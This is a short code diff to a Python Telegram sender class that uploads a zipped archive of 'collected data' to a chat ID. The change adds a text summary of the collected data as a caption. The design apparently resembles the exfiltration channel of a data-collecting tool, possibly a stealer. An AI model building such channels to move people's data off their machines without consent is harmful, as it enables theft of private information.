@@ -27,7 +27,7 @@ class Telegram(AbstractSender):
         - tuple: A tuple of content type, body, and Telegram api url.
         """
         content_type, body = self._encoder.encode(
-            [("chat_id", self.__user_id)],
+            [("chat_id", self.__user_id), ("caption", self.__preview)],
             [("document", f"{self.__zip_name}.zip", self.__data)]
         )
 
@@ -51,19 +51,21 @@ class Telegram(AbstractSender):
 
         urlopen(query)
 
-    def run(self, zip_name: str, data: BytesIO) -> None:
+    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
         """
         Launches the sender module.
 
         Parameters:
         - zip_name [str]: Archive name.
         - data [BytesIO]: BytesIO object.
+        - preview [str]: Collected data summary.
 
         Returns:
         - None.
         """
         self.__zip_name = zip_name
         self.__data = data
+        self.__preview = preview
 
         try:
 
